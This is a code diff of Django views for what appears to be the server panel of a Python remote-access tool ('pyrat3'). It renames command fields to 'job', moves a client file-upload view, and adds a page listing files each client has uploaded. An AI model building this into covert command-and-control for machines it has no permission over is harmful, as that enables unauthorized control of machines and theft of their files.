@@ -29,8 +29,10 @@ from ast import literal_eval
 # Create your views here.
 from django.http import HttpResponse, Http404
 
+import os
 
-def new_command_id(size=6, chars=string.ascii_uppercase + string.digits):
+
+def new_job_id(size=6, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
 
 
@@ -38,7 +40,7 @@ class Index(generic.edit.FormView):
 
     template_name = 'pyrat3_server/index.html'
     form_class = ClientSendCommandForm
-    initial = {'command_id': new_command_id}
+    initial = {'job_id': new_job_id}
     #success_url = 'index'
 
     def post(self, request, *args, **kwargs):
@@ -53,10 +55,10 @@ class Index(generic.edit.FormView):
                 #print(type(client_id))
                 #client = form.save(commit=False)
                 client = Client.objects.get(client_id=client_id)
-                client.command_id = form.cleaned_data['command_id']
-                client.command = form.cleaned_data['command']
-                client.command_datetime = datetime.now(tz=pytz.utc)
-                client.command_args = form.cleaned_data['command_args']
+                client.job_id = form.cleaned_data['job_id']
+                client.job = form.cleaned_data['job']
+                client.job_datetime = datetime.now(tz=pytz.utc)
+                client.job_args = form.cleaned_data['job_args']
                 client.save()
             return self.form_valid(form)
         else:
@@ -72,13 +74,6 @@ class Index(generic.edit.FormView):
         return JsonResponse({'form_valid': False}, status=400)
 
 
-def generate_command_id(request):
-
-    command_id = new_command_id()
-
-    return JsonResponse({'command_id': command_id})
-
-
 class ClientTable(generic.ListView):
 
     context_object_name = 'clients'
@@ -87,6 +82,66 @@ class ClientTable(generic.ListView):
     def get_queryset(self):
 
         return Client.objects.all().order_by('-join_datetime')
+
+
+class ClientUploadFile(generic.FormView):
+
+    template_name = 'pyrat3_server/upload.html'
+    form_class = ClientSendFileForm
+
+    def get(self, request, *args, **kwargs):
+
+        if Client.objects.filter(pk=self.kwargs['pk']).exists():
+            """Handle GET requests: instantiate a blank version of the form."""
+            return self.render_to_response(self.get_context_data())
+        else:
+            raise Http404
+
+    def post(self, request, *args, **kwargs):
+
+        """
+        Handle POST requests: instantiate a form instance with the passed
+        POST variables and then check if it's valid.
+        """
+        form = self.get_form()
+        if form.is_valid():
+            print(self.kwargs)
+            print(form.cleaned_data)
+            client_id = self.kwargs['pk']
+            file = form.cleaned_data['file']
+            fs = FileSystemStorage(location=path.join(settings.MEDIA_ROOT, client_id))
+            fs.save(file.name, file)
+            return self.form_valid(form)
+        else:
+            return self.form_invalid(form)
+
+    def form_valid(self, form):
+
+        return HttpResponse('OK')
+
+    # funkcja na odpowiedz w formie Json na valid i invalid form
+
+
+def client_files(request, **kwargs):
+
+    client_id = kwargs['pk']
+    files = os.listdir(os.path.join(settings.MEDIA_ROOT, client_id))
+    # Render a webpage with links to files
+    return render(
+        request,
+        'pyrat3_server/files.html',
+        {
+            'files': files,
+            'client_id': client_id
+        }
+    )
+
+
+def generate_job_id(request):
+
+    job_id = new_job_id()
+
+    return JsonResponse({'job_id': job_id})
 
 
 class ClientList(views.APIView):
@@ -128,40 +183,3 @@ class ClientDetail(generics.RetrieveUpdateAPIView):
     queryset = Client.objects.all()
     serializer_class = ClientSerializer
 
-
-class ClientUploadFile(generic.FormView):
-
-    template_name = 'pyrat3_server/upload.html'
-    form_class = ClientSendFileForm
-
-    def get(self, request, *args, **kwargs):
-
-        if Client.objects.filter(pk=self.kwargs['pk']).exists():
-            """Handle GET requests: instantiate a blank version of the form."""
-            return self.render_to_response(self.get_context_data())
-        else:
-            raise Http404
-
-    def post(self, request, *args, **kwargs):
-
-        """
-        Handle POST requests: instantiate a form instance with the passed
-        POST variables and then check if it's valid.
-        """
-        form = self.get_form()
-        if form.is_valid():
-            print(self.kwargs)
-            print(form.cleaned_data)
-            client_id = self.kwargs['pk']
-            file = form.cleaned_data['file']
-            fs = FileSystemStorage(location=path.join(settings.MEDIA_ROOT, client_id))
-            fs.save(file.name, file)
-            return self.form_valid(form)
-        else:
-            return self.form_invalid(form)
-
-    def form_valid(self, form):
-
-        return HttpResponse('OK')
-
-    # funkcja na odpowiedz w formie Json na valid i invalid form
